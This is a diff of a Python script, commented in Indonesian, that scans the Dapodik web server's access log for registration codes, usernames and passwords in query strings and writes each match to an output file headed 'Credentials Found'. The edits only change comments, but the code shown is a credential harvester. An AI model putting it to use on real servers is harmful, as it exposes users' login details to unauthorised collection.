@@ -22,11 +22,12 @@ def extractParam(queryString, paramName):
     return None # Parameter tidak ditemukan
 
 def main():
-    """
-    Fungsi utama untuk membaca log, mengekstrak data, dan menulis ke file output.
-    """
-    # Jalur file log.
+    
+    # Fungsi utama untuk membaca log, mengektrak data, dan menulis ke file output.
+    
+    # Jalur file log
     logFilePath = "C:/Program Files (x86)/Dapodik/webserver/logs/access.log"
+    # Nama file output
     outputFileName = "OutputRetriever.txt"
 
     try:
@@ -56,7 +57,7 @@ def main():
                                 username = extractParam(rawQueryString, "username")
                                 password = extractParam(rawQueryString, "password")
 
-                                # Hanya tulis ke file output jika ketiga parameter ditemukan DAN tidak kosong
+                                # Hanya tulis ke file output jika ketiga parameter ditemukan dan tidak kosong
                                 if registrationCode and username and password:
                                     outputFile.write("------- Kredensial Ditemukan -------\n")
                                     outputFile.write(f"Kode Registrasi: {registrationCode}\n")
